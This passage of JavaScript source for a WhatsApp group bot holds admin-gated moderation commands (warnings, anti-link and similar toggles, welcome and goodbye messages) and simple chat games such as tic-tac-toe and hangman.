                await empire.groupParticipantsUpdate(m.chat, [targetJid], 'add');
                await empire.sendMessage(m.chat, {
                    text: `✅ Added @${num} to the group!`,
                    mentions: [targetJid],
                    contextInfo: newsletterContext({ mentionedJid: [targetJid] })
                }, { quoted: m });
            } catch (e) {
                reply(`❌ Couldn't add @${num}. They may have privacy settings preventing this, or an invalid number was given.`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // GROUPLINK - fetch the group invite link
        // ═══════════════════════════════════════════════════
        case 'grouplink':
        case 'invitelink':
        case 'link': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            try {
                const code = await empire.groupInviteCode(m.chat);
                reply(`🔗 *Group Invite Link*\n\nhttps://chat.whatsapp.com/${code}`);
            } catch (e) {
                reply("❌ Couldn't fetch invite link.");
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // SETGCPP - set group profile picture
        // ═══════════════════════════════════════════════════
        case 'setgcpp':
        case 'setgroupicon':
        case 'setgcicon': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ I need to be admin to do that!");
            const quoted = m.quoted ? m.quoted : m;
            const mime = quoted.mimetype || '';
            if (!/image/.test(mime)) {
                return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setgcpp\n\nSets the group's profile picture.`);
            }
            try {
                await reply('⏳ *Updating group picture...*');
                const mediaBuffer = await empire.downloadMediaMessage(quoted);
                if (!mediaBuffer || mediaBuffer.length === 0) return reply('❌ Failed to download image.');
                await empire.updateProfilePicture(m.chat, mediaBuffer);
                reply('✅ *Group picture updated successfully!*');
            } catch (e) {
                reply(`❌ *Failed to update group picture:* ${e.message || 'Unknown error'}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // WARN SYSTEM - warn / unwarn / warnings
        // ═══════════════════════════════════════════════════
        case 'warn': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}warn @user`);
            const k = `${m.chat}_${target}`;
            db.warns[k] = (db.warns[k] || 0) + 1;
            saveDB();
            const count = db.warns[k];
            await empire.sendMessage(m.chat, {
                text: `⚠️ @${target.split('@')[0]} has been warned! (${count}/3)`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            if (count >= 3) {
                await empire.groupParticipantsUpdate(m.chat, [target], 'remove').catch(() => {});
                delete db.warns[k];
                saveDB();
                await empire.sendMessage(m.chat, {
                    text: `👢 @${target.split('@')[0]} reached 3 warnings and was removed.`,
                    mentions: [target],
                    contextInfo: newsletterContext({ mentionedJid: [target] })
                });
            }
            break;
        }
        case 'unwarn':
        case 'resetwarn': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}unwarn @user`);
            const k = `${m.chat}_${target}`;
            delete db.warns[k];
            saveDB();
            await empire.sendMessage(m.chat, {
                text: `✅ Warnings cleared for @${target.split('@')[0]}.`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }
        case 'warnings':
        case 'warncount': {
            if (!isGroup) return reply("👥 Group only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null) || m.sender;
            const k = `${m.chat}_${target}`;
            const count = db.warns[k] || 0;
            await empire.sendMessage(m.chat, {
                text: `⚠️ @${target.split('@')[0]} has ${count}/3 warnings.`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // LISTADMINS
        // ═══════════════════════════════════════════════════
        case 'listadmins':
        case 'admins': {
            if (!isGroup) return reply("👥 Group only!");
            if (groupAdmins.length === 0) return reply("❌ No admins found.");
            const list = groupAdmins.map(a => `👑 @${a.split('@')[0]}`).join('\n');
            await empire.sendMessage(m.chat, {
                text: `👑 *GROUP ADMINS (${groupAdmins.length})*\n\n${list}`,
                mentions: groupAdmins,
                contextInfo: newsletterContext({ mentionedJid: groupAdmins })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTILINK
        // ═══════════════════════════════════════════════════
        case 'antilink':
        case 'al': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'antilink', true); setSetting(m.chat, 'antilink_action', 'delete'); reply(`🔗 *ANTI-LINK ON*`); }
            else if (opt === 'off') { setSetting(m.chat, 'antilink', false); reply(`✅ *ANTI-LINK OFF*`); }
            else if (opt === 'action') {
                const a = args[1]?.toLowerCase();
                if (['delete','warn','kick'].includes(a)) { setSetting(m.chat, 'antilink_action', a); reply(`✅ Action: *${a.toUpperCase()}*`); }
                else reply(`Actions: delete, warn, kick`);
            } else {
                const s = getSetting(m.chat, 'antilink', false);
                const a = getSetting(m.chat, 'antilink_action', 'delete');
                reply(`🔗 *ANTI-LINK*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\nAction: ${a.toUpperCase()}\n\n${prefix}antilink on/off\n${prefix}antilink action <delete/warn/kick>`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTISTICKER
        // ═══════════════════════════════════════════════════
        case 'antisticker': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'antisticker', true); reply(`🎭 *ANTI-STICKER ON*`); }
            else if (opt === 'off') { setSetting(m.chat, 'antisticker', false); reply(`✅ *ANTI-STICKER OFF*`); }
            else if (opt === 'action') {
                const a = args[1]?.toLowerCase();
                if (['delete','warn','kick'].includes(a)) { setSetting(m.chat, 'antisticker_action', a); reply(`✅ Action: *${a.toUpperCase()}*`); }
                else reply(`Actions: delete, warn, kick`);
            } else {
                const s = getSetting(m.chat, 'antisticker', false);
                reply(`🎭 *ANTI-STICKER*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antisticker on/off\n${prefix}antisticker action <delete/warn/kick>`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTITAG
        // ═══════════════════════════════════════════════════
        case 'antitag':
        case 'at': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'antitag', true); setSetting(m.chat, 'antitag_action', 'delete'); reply(`🚫 *ANTI-TAG ON*`); }
            else if (opt === 'off') { setSetting(m.chat, 'antitag', false); reply(`✅ *ANTI-TAG OFF*`); }
            else if (opt === 'action') {
                const a = args[1]?.toLowerCase();
                if (['delete','warn','kick'].includes(a)) { setSetting(m.chat, 'antitag_action', a); reply(`✅ Action: *${a.toUpperCase()}*`); }
                else reply(`Actions: delete, warn, kick`);
            } else {
                const s = getSetting(m.chat, 'antitag', false);
                reply(`🚫 *ANTI-TAG*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antitag on/off\n${prefix}antitag action <delete/warn/kick>`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTIVIEWONCE
        // ═══════════════════════════════════════════════════
        case 'antiviewonce':
        case 'avo': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'antiviewonce', true); reply(`👁️ *ANTI-VIEWONCE ON*`); }
            else if (opt === 'off') { setSetting(m.chat, 'antiviewonce', false); reply(`✅ *ANTI-VIEWONCE OFF*`); }
            else {
                const s = getSetting(m.chat, 'antiviewonce', false);
                reply(`👁️ *ANTI-VIEWONCE*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antiviewonce on/off`);
            }
            break;
        }
        
       
        

        // ═══════════════════════════════════════════════════
        // ANTICALL
        // ═══════════════════════════════════════════════════
        case 'anticall': {
            if (!isCreator) return reply("❌ Owner only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting('global', 'anticall', true); reply(`📵 *ANTI-CALL ON*`); }
            else if (opt === 'off') { setSetting('global', 'anticall', false); reply(`✅ *ANTI-CALL OFF*`); }
            else {
                const s = getSetting('global', 'anticall', false);
                reply(`📵 *ANTI-CALL*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}anticall on/off`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTIDELETE
        // ═══════════════════════════════════════════════════
        case 'antidelete':
        case 'ad': {
            await antidelete.handleCommand(empire, m.chat, m, text, isCreator);
            break;
        }

        // ═══════════════════════════════════════════════════
        // ANTIBOT
        // ═══════════════════════════════════════════════════
        case 'antibot': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'antibot', true); reply(`🤖 *ANTI-BOT ON*`); }
            else if (opt === 'off') { setSetting(m.chat, 'antibot', false); reply(`✅ *ANTI-BOT OFF*`); }
            else {
                const s = getSetting(m.chat, 'antibot', false);
                reply(`🤖 *ANTI-BOT*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antibot on/off`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // WELCOME
        // ═══════════════════════════════════════════════════
        case 'welcome': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'welcome', true); reply(`👋 *WELCOME ON*\nCustomize: ${prefix}setwelcome <msg>\nVariables: @user @group`); }
            else if (opt === 'off') { setSetting(m.chat, 'welcome', false); reply(`✅ *WELCOME OFF*`); }
            else {
                const s = getSetting(m.chat, 'welcome', false);
                const msg = getSetting(m.chat, 'welcomeMessage', '👋 Welcome @user to @group!');
                reply(`👋 *WELCOME*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\nMessage: ${msg}\n\n${prefix}welcome on/off\n${prefix}setwelcome <msg>`);
            }
            break;
        }
        case 'setwelcome': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!text) return reply(`Usage: ${prefix}setwelcome <message>\nVariables: @user @group`);
            setSetting(m.chat, 'welcomeMessage', text);
            reply(`✅ *Welcome message set!*\n\n${text}`);
            break;
        }

        // ═══════════════════════════════════════════════════
        // GOODBYE
        // ═══════════════════════════════════════════════════
        case 'goodbye': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            const opt = args[0]?.toLowerCase();
            if (opt === 'on') { setSetting(m.chat, 'goodbye', true); reply(`👋 *GOODBYE ON*\nCustomize: ${prefix}setgoodbye <msg>`); }
            else if (opt === 'off') { setSetting(m.chat, 'goodbye', false); reply(`✅ *GOODBYE OFF*`); }
            else {
                const s = getSetting(m.chat, 'goodbye', false);
                reply(`👋 *GOODBYE*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}goodbye on/off\n${prefix}setgoodbye <msg>`);
            }
            break;
        }
        case 'setgoodbye': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!text) return reply(`Usage: ${prefix}setgoodbye <message>`);
            setSetting(m.chat, 'goodbyeMessage', text);
            reply(`✅ *Goodbye message set!*\n\n${text}`);
            break;
        }

        // ═══════════════════════════════════════════════════
        // TIC TAC TOE
        // ═══════════════════════════════════════════════════
        case 'tictactoe':
        case 'ttt': {
            const existing = tttGames.get(m.chat);
            const arg = args[0]?.toLowerCase();

            // ── Make a move ──
            if (existing && arg && /^[1-9]$/.test(arg)) {
                const pos = parseInt(arg, 10) - 1;
                const mySymbol = existing.players.X === m.sender ? 'X' : existing.players.O === m.sender ? 'O' : null;
                if (!mySymbol) return reply("❌ You're not a player in this game!");
                if (existing.turn !== mySymbol) return reply("⏳ It's not your turn!");
                if (existing.board[pos] !== '') return reply("❌ That cell is already taken!");

                existing.board[pos] = mySymbol;
                let winner = checkTTTWinner(existing.board);

                if (winner) {
                    tttGames.delete(m.chat);
                    const boardText = renderTTTBoard(existing.board);
                    if (winner === 'draw') {
                        return reply(`🎮 *TIC TAC TOE*\n\n${boardText}\n\n🤝 It's a draw!`);
                    }
                    const winnerJid = existing.players[winner];
                    const winMsg = winnerJid === 'bot' ? '🤖 Bot wins!' : `🏆 @${winnerJid.split('@')[0]} wins!`;
                    await empire.sendMessage(m.chat, {
                        text: `🎮 *TIC TAC TOE*\n\n${boardText}\n\n${winMsg}`,
                        mentions: winnerJid !== 'bot' ? [winnerJid] : [],
                        contextInfo: newsletterContext()
                    }, { quoted: m });
                    break;
                }

                existing.turn = existing.turn === 'X' ? 'O' : 'X';

                // bot's turn
                if (existing.vsBot && existing.players[existing.turn] === 'bot') {
                    const botPos = botTTTMove(existing.board);
                    existing.board[botPos] = existing.turn;
                    const w2 = checkTTTWinner(existing.board);
                    if (w2) {
                        tttGames.delete(m.chat);
                        const boardText2 = renderTTTBoard(existing.board);
                        const msg2 = w2 === 'draw' ? "🤝 It's a draw!" : (w2 === existing.turn ? '🤖 Bot wins!' : '🏆 You win!');
                        return reply(`🎮 *TIC TAC TOE*\n\n${boardText2}\n\n${msg2}`);
                    }
                    existing.turn = existing.turn === 'X' ? 'O' : 'X';
                }

                const nextJid = existing.players[existing.turn];
                const turnText = nextJid === 'bot' ? "🤖 Bot's turn..." : `@${nextJid.split('@')[0]}'s turn (${existing.turn})`;
                await empire.sendMessage(m.chat, {
                    text: `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(existing.board)}\n\n${turnText}`,
                    mentions: nextJid !== 'bot' ? [nextJid] : [],
                    contextInfo: newsletterContext()
                }, { quoted: m });
                break;
            }

            // ── End game ──
            if (arg === 'end' || arg === 'stop') {
                if (!existing) return reply("❌ No active Tic Tac Toe game!");
                tttGames.delete(m.chat);
                reply("🛑 Tic Tac Toe game ended.");
                break;
            }

            // ── Already running ──
            if (existing) {
                return reply(`🎮 A game is already in progress!\n\n${renderTTTBoard(existing.board)}\n\nUse ${prefix}ttt <1-9> to play, or ${prefix}ttt end to cancel.`);
            }

            // ── Start a new game ──
            const opponent = m.mentionedJid?.[0];
            if (opponent === m.sender) return reply("❌ You can't play against yourself!");
            if (opponent === botNumber) return reply(`🤖 Just type \`${prefix}ttt\` alone to play against me!`);
            const vsBot = !opponent;

            const newGame = {
                board: Array(9).fill(''),
                players: { X: m.sender, O: vsBot ? 'bot' : opponent },
                turn: 'X',
                vsBot
            };
            tttGames.set(m.chat, newGame);

            const startMsg = vsBot
                ? `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(newGame.board)}\n\n@${m.sender.split('@')[0]} (❌) vs 🤖 Bot (⭕)\n\nYour turn! Use ${prefix}ttt <1-9>`
                : `🎮 *TIC TAC TOE*\n\n${renderTTTBoard(newGame.board)}\n\n@${m.sender.split('@')[0]} (❌) vs @${opponent.split('@')[0]} (⭕)\n\n@${m.sender.split('@')[0]}'s turn! Use ${prefix}ttt <1-9>`;

            await empire.sendMessage(m.chat, {
                text: startMsg,
                mentions: vsBot ? [m.sender] : [m.sender, opponent],
                contextInfo: newsletterContext()
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // HANGMAN
        // ═══════════════════════════════════════════════════
        case 'hangman':
        case 'hm': {
            const existing = hangmanGames.get(m.chat);
            const arg = args[0]?.toLowerCase();

            if (arg === 'end' || arg === 'stop') {
                if (!existing) return reply("❌ No active Hangman game!");
                hangmanGames.delete(m.chat);
                reply(`🛑 Hangman ended. The word was *${existing.word.toUpperCase()}*.`);
                break;
            }

            if (existing) {
                return reply(`🎮 A Hangman game is already in progress!\n\n${renderHangman(existing)}\n\nUse ${prefix}guess <letter> to play.`);
            }

            const pick = HANGMAN_WORDS[Math.floor(Math.random() * HANGMAN_WORDS.length)];
            const newGame = { word: pick.word.toLowerCase(), category: pick.category, guessed: new Set(), wrong: 0, maxWrong: 6 };
            hangmanGames.set(m.chat, newGame);

            reply(`🎮 *HANGMAN*\n\n📁 Category: ${newGame.category}\n\n${renderHangman(newGame)}\n\nGuess a letter with ${prefix}guess <letter>`);
            break;
        }

        // ═══════════════════════════════════════════════════
        // GUESS - used for the active Hangman game
        // ═══════════════════════════════════════════════════
        case 'guess': {
            const existing = hangmanGames.get(m.chat);
            if (!existing) return reply(`❌ No active Hangman game! Start one with ${prefix}hangman`);

            const letter = (args[0] || '').toLowerCase();
            if (!letter || letter.length !== 1 || !/[a-z]/.test(letter)) {
                return reply(`Usage: ${prefix}guess <a single letter>`);
            }
            if (existing.guessed.has(letter)) return reply(`❌ You've already guessed *${letter}*!`);

            existing.guessed.add(letter);
            if (!existing.word.includes(letter)) existing.wrong++;

            const revealed = existing.word.split('').every(c => existing.guessed.has(c));
            const lost = existing.wrong >= existing.maxWrong;

            if (revealed) {
                hangmanGames.delete(m.chat);
                return reply(`🎉 *YOU WIN!*\n\nThe word was *${existing.word.toUpperCase()}*\n\n${renderHangman(existing)}`);
            }
            if (lost) {
                hangmanGames.delete(m.chat);
                return reply(`💀 *GAME OVER!*\n\nThe word was *${existing.word.toUpperCase()}*\n\n${renderHangman(existing)}`);
            }
            reply(`${renderHangman(existing)}\n\nGuess another letter with ${prefix}guess <letter>`);
            break;
        }

        // ═══════════════════════════════════════════════════
        // ROCK PAPER SCISSORS
        // ═══════════════════════════════════════════════════
        case 'rps': {
            const choices = ['rock', 'paper', 'scissors'];
            const emojis = { rock: '🪨', paper: '📄', scissors: '✂️' };
            const userChoice = (args[0] || '').toLowerCase();
            if (!choices.includes(userChoice)) return reply(`Usage: ${prefix}rps <rock/paper/scissors>`);

            const botChoice = choices[Math.floor(Math.random() * choices.length)];
            let result;
            if (userChoice === botChoice) result = "🤝 It's a tie!";
            else if (
                (userChoice === 'rock' && botChoice === 'scissors') ||
                (userChoice === 'paper' && botChoice === 'rock') ||
                (userChoice === 'scissors' && botChoice === 'paper')
            ) result = '🎉 You win!';
            else result = '🤖 Bot wins!';

            reply(`🎮 *ROCK PAPER SCISSORS*\n\nYou: ${emojis[userChoice]} ${userChoice}\nBot: ${emojis[botChoice]} ${botChoice}\n\n${result}`);
            break;
        }

        default:
            break;
        }

    } catch (err) {
        console.error('Command error:', err);
        if (m?.chat) empire.sendMessage(m.chat, {
            text: `❌ Error: ${err.message}`,
            contextInfo: newsletterContext()
        }).catch(() => {});
    }
};

// ========== ANTI-CALL EXPORT ==========
module.exports.handleAntiCall = handleAntiCall;

// ========== GROUP PARTICIPANTS UPDATE (welcome/goodbye) ==========
const originalGroupParticipantsUpdate = empire.groupParticipantsUpdate;
empire.groupParticipantsUpdate = async function (update) {
    try {
        const result = await originalGroupParticipantsUpdate?.apply(this, arguments);
        if (update?.id && update?.participants) {
            const gm = await this.groupMetadata(update.id).catch(() => null);
            if (gm) {
                await handleGroupParticipantsUpdate(this, update, gm, this.user.id);
            }
        }
        return result;
    } catch (e) { console.error('Group update error:', e); }
};

// ========== HOT RELOAD ==========
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' updated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
